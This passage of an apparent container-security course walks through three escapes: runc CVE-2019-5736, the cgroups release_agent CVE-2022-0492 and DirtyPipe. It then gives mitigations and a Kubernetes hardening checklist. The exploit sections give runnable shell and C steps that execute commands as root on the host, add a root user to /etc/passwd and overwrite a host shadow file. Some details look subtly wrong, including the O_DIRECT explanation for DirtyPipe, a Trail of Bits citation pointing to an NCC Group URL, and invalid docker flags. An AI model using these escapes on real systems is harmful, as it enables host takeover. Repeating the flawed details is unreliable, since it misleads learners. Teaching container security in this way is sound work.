    // its own binary via /proc/self/exe
    
    // Step 3: When runc exec enters the container, the leaked fd
    // pointing to the host runc binary can be overwritten
    
    // Alternative approach: use /proc/self/exe to write a
    // malicious binary over the host runc binary
    int fd = open("/proc/self/exe", O_RDONLY);
    // This fd points to the runc binary on the host filesystem
    // Writing to this fd overwrites the host runc binary
    
    // The attacker can now:
    // 1. Write a backdoor to the host
    // 2. Wait for the next runc execution on the host
    // 3. The backdoor runs as root on the host
    
    return 0;
}
```

### 9.4 Mitigation

```bash
# Mitigation 1: Upgrade runc to >= 1.0-rc6
# The fix ensures that /proc/self/exe is opened BEFORE entering
# the container namespace, so the fd points to the host binary
# but cannot be written to from inside the container

# Mitigation 2: Use read-only container filesystem
docker run --read-only -it alpine sh
# Prevents the container from modifying /bin/sh

# Mitigation 3: Use user namespace remapping
dockerd --userns-remap="default"
# Even if runc is overwritten, the container process has no
# privileges to write to the host filesystem

# Mitigation 4: Use seccomp to block relevant syscalls
# Seccomp profile that blocks write operations on /proc/self/exe
```

---

## 10. CVE-2022-0492: cgroups Escape

### 10.1 Vulnerability Overview

| Field | Detail |
|---|---|
| **CVE** | CVE-2022-0492 |
| **Severity** | CVSS 7.0 (High) |
| **Affected** | Linux kernel before 5.16.11, cgroups v1 |
| **Type** | cgroups release_agent privilege escalation |
| **Root Cause** | Insufficient validation of cgroup hierarchies in release_agent |

### 10.2 Technical Details

cgroups v1 has a `release_agent` feature that executes a user-specified binary when all processes leave a cgroup. The Linux kernel did not properly validate whether the cgroup belonged to the init namespace vs. a container namespace, allowing a privileged container process to set a `release_agent` that would execute as root on the host.

```bash
# CVE-2022-0492 exploitation (requires CAP_SYS_ADMIN in container)
# This works because cgroups v1 allows unprivileged users to create sub-cgroups
# and set release_agent on those sub-cgroups

# Step 1: Create a cgroup sub-hierarchy
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# Step 2: Enable release_notification
echo 1 > /tmp/cgrp/x/notify_on_release

# Step 3: Find the host path of the container's root filesystem
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Step 4: Set the release_agent to execute a command on the host
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Step 5: Create the command script
cat > /cmd << 'EOF'
#!/bin/sh
ps aux > $host_path/output
EOF
chmod +x /cmd

# Step 6: Trigger the release_agent by creating and releasing a process
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Step 7: The script executes as root on the host
cat /output
```

### 10.3 Mitigation

```bash
# Mitigation 1: Use cgroups v2 (unified hierarchy)
# cgroups v2 does not have the release_agent feature
mount -t cgroup2 cgroup2 /sys/fs/cgroup

# Mitigation 2: Drop CAP_SYS_ADMIN from containers
docker run --cap-drop=SYS_ADMIN -it alpine sh
# Or in Kubernetes:
# securityContext:
#   capabilities:
#     drop: ["SYS_ADMIN"]

# Mitigation 3: Run containers in read-only cgroup hierarchies
# The container should not be able to mount cgroup filesystems

# Mitigation 4: Use Seccomp to block mount() syscall
# Docker's default seccomp profile already blocks mount()
# But running with --privileged disables seccomp

# Mitigation 5: Apply kernel patch (5.16.11+)
# The patch adds proper namespace validation in cgroup release_agent
```

---

## 11. CVE-2022-0847: DirtyPipe Container Escape

### 11.1 Vulnerability Overview

| Field | Detail |
|---|---|
| **CVE** | CVE-2022-0847 |
| **Severity** | CVSS 7.8 (High) |
| **Affected** | Linux kernel 5.8 - 5.16.11, 5.15.25, 5.10.102 |
| **Type** | Arbitrary file overwrite via pipe buffer page cache manipulation |
| **Discoverer** | Max Kellermann |
| **Similar to** | Dirty COW (CVE-2016-5195) |

### 11.2 Technical Deep Dive

DirtyPipe exploits a flaw in the Linux kernel's pipe buffer handling. When a pipe is created with `O_DIRECT`, the kernel allocates a new page for the pipe buffer and marks it with the `PIPE_BUF_FLAG_CAN_MERGE` flag. This flag indicates that subsequent writes to the pipe can be merged into the same page. The vulnerability is that this flag persists even after the page has been merged into the page cache (i.e., after `splice()` is called), allowing an unprivileged process to overwrite arbitrary pages in the page cache.

```c
// Simplified DirtyPipe POC
// The vulnerability is in the pipe buffer handling code in fs/pipe.c

// Step 1: Create a pipe
int pipefd[2];
pipe(pipefd);

// Step 2: Fill the pipe with arbitrary data to set PIPE_BUF_FLAG_CAN_MERGE
// This flag is set when pipe_buffer.buf is allocated
for (int i = 0; i < PIPE_CAPACITY; i++) {
    write(pipefd[1], "A", 1);
}

// Step 3: Drain the pipe (read all data)
for (int i = 0; i < PIPE_CAPACITY; i++) {
    char c;
    read(pipefd[0], &c, 1);
}

// Step 4: Now the pipe has empty buffers but PIPE_BUF_FLAG_CAN_MERGE is still set

// Step 5: Use splice() to copy a page from a target file into the pipe
// splice() copies file data directly into the pipe buffer WITHOUT clearing
// the PIPE_BUF_FLAG_CAN_MERGE flag
int fd = open("/etc/passwd", O_RDONLY);
splice(fd, &offset, pipefd[1], NULL, PAGE_SIZE, 0);

// Step 6: Write arbitrary data to the pipe
// Because PIPE_BUF_FLAG_CAN_MERGE is still set, the write merges into
// the page cache page that was loaded by splice()
write(pipefd[1], "attacker:x:0:0:root:/root:/bin/bash\n", 36);

// Result: The page cache for /etc/passwd is now corrupted
// The modification persists until the page is evicted from cache
// On read-heavy files, this could persist for hours
```

### 11.3 Container Escape via DirtyPipe

```bash
# DirtyPipe container escape scenario:
# 1. The container has a read-only root filesystem (common in Kubernetes)
# 2. The container process can use DirtyPipe to modify read-only files
#    (because DirtyPipe modifies the page cache, not the underlying filesystem)
# 3. If /etc/passwd or /etc/shadow is in the container's filesystem,
#    the attacker can add a root user

# Attack sequence inside a container:
# Step 1: Compile DirtPipe POC
gcc dirtypipe.c -o dirtypipe

# Step 2: Modify /etc/passwd to add root user
./dirtypipe /etc/passwd 1 "attacker:x:0:0::/root:/bin/bash"

# Step 3: Switch to the new root user
su attacker

# Step 4: If the container mounts host volumes, modify host files:
# (requires host volume to be mounted, e.g., hostPath in Kubernetes)
./dirtypipe /host-etc/shadow 1 "root::0:0:99999::::"

# Step 5: SSH to the host with the modified credentials
ssh root@host-ip

# Alternative: overwrite /usr/bin/sudo with a backdoored binary
# This works even with read-only container filesystems because
# DirtyPipe modifies the page cache, not the filesystem
```

### 11.4 DirtyPipe vs Dirty COW

| Aspect | DirtyPipe (CVE-2022-0847) | Dirty COW (CVE-2016-5195) |
|---|---|---|
| **Mechanism** | Pipe buffer flag persistence | Race condition in COW page fault handling |
| **Reliability** | 100% reliable | Race condition, requires timing |
| **Scope** | Arbitrary page cache overwrite | Arbitrary memory overwrite (including read-only pages) |
| **Container impact** | Modifies read-only mounted files | Modifies read-only mapped memory |
| **Patch** | Clear `PIPE_BUF_FLAG_CAN_MERGE` after splice | Fix COW page fault race condition |
| **Complexity** | Low (simple pipe operations) | High (requires race condition exploitation) |

**Cross-reference**: DirtyPipe and Dirty COW are both Linux kernel vulnerabilities that affect container security. See the Linux Kernel track (`linux_kernel/docs/02a_vuln_classes.md`) for detailed analysis of use-after-free, race condition, and other vulnerability classes that underpin these container escapes. The Zero Day track (`zero_day/docs/`) covers the exploit development methodology for these vulnerability types.

---

## 12. Container Security Hardening Checklist

### 12.1 Runtime Hardening

| Category | Control | Implementation |
|---|---|---|
| **Namespaces** | Use all namespaces (PID, net, mnt, user, UTS, IPC, cgroup) | `docker run --pid=private --net=private...` |
| **User Namespace** | Enable user namespace remapping | `daemon.json: {"userns-remap": "default"}` |
| **Capabilities** | Drop all capabilities, add only what's needed | `docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE` |
| **Seccomp** | Use custom seccomp profiles | `docker run --security-opt seccomp=custom.json` |
| **AppArmor** | Use custom AppArmor profiles | `docker run --security-opt apparmor=docker-custom` |
| **SELinux** | Use MCS labels for container isolation | `docker run --security-opt label=level:s0:c100,c200` |
| **Read-only FS** | Make container filesystem read-only | `docker run --read-only --tmpfs /tmp` |
| **No new privileges** | Prevent privilege escalation | `docker run --security-opt no-new-privileges` |
| **Resource limits** | Set CPU, memory, PID limits | `docker run --memory=512m --cpus=1 --pids-limit=100` |

### 12.2 Image Hardening

| Category | Control | Implementation |
|---|---|---|
| **Base image** | Use minimal or distroless images | `FROM gcr.io/distroless/static` |
| **Non-root user** | Never run as root | `USER 1000:1000` in Dockerfile |
| **Multi-stage build** | Separate build and runtime stages | Use `FROM ... AS builder` pattern |
| **Vulnerability scanning** | Scan all images before deployment | `trivy image myregistry.io/myapp:v1.0.0` |
| **Image signing** | Sign and verify images | `cosign sign --key cosign.key myregistry.io/myapp:v1` |
| **SBOM** | Generate and attach SBOM | `syft myapp:v1 -o spdx-json > sbom.json` |
| **Secret management** | Never embed secrets in images | Use `--secret` flag or secret managers |
| **Pinning** | Pin all package versions | `apt-get install python3=3.11.2-1` |

### 12.3 Kubernetes-Specific Hardening

```yaml
# Kubernetes Pod Security Context (complete hardening example)
apiVersion: v1
kind: Pod
metadata:
  name: hardened-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    image: gcr.io/distroless/python3:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
          - ALL
        add:
          - NET_BIND_SERVICE
    resources:
      limits:
        memory: "512Mi"
        cpu: "1"
      requests:
        memory: "256Mi"
        cpu: "500m"
    volumeMounts:
    - name: tmp
      mountPath: /tmp
  volumes:
  - name: tmp
    emptyDir:
      medium: Memory
      sizeLimit: "128Mi"
```

**Cross-reference**: Container security is deeply intertwined with Kubernetes security (see `02b_kubernetes_security.md`), cloud IAM (see `01b_identity_access_management.md`), and Linux kernel security (see `linux_kernel/docs/02a_vuln_classes.md`). The isolation primitives discussed here are the foundation upon which all container security is built.

---

*Next: [02b — Kubernetes Security](02b_kubernetes_security.md)*

---

## References

1. CVE-2019-5736. NVD. https://nvd.nist.gov/vuln/detail/CVE-2019-5736
2. CVE-2022-0492. NVD. https://nvd.nist.gov/vuln/detail/CVE-2022-0492
3. CVE-2022-0847 (DirtyPipe). NVD. https://nvd.nist.gov/vuln/detail/CVE-2022-0847
4. NIST. "SP 800-190: Application Container Security Guide." *National Institute of Standards and Technology*. 2024. https://csrc.nist.gov/publications/detail/sp/800-190/final
5. Trail of Bits. "Understanding and Hardening Linux Containers." *Trail of Bits*. 2020. https://www.nccgroup.com/research-blog/understanding-and-hardening-linux-containers/
6. Docker. "Docker Security." *Docker Documentation*. 2024. https://docs.docker.com/engine/security/
7. Aqua Security. "Container Threat Report." *Aqua Security*. 2023. https://info.aquasec.com/cloud-native-threat-report
8. Linux Kernel. "Namespaces Manual." *man7.org*. 2024. https://man7.org/linux/man-pages/man7/namespaces.7.html
9. Linux Kernel. "Seccomp Manual." *man7.org*. 2024. https://man7.org/linux/man-pages/man2/seccomp.2.html
10. Open Container Initiative. "OCI Runtime Specification." *Open Container Initiative*. 2024. https://github.com/opencontainers/runtime-spec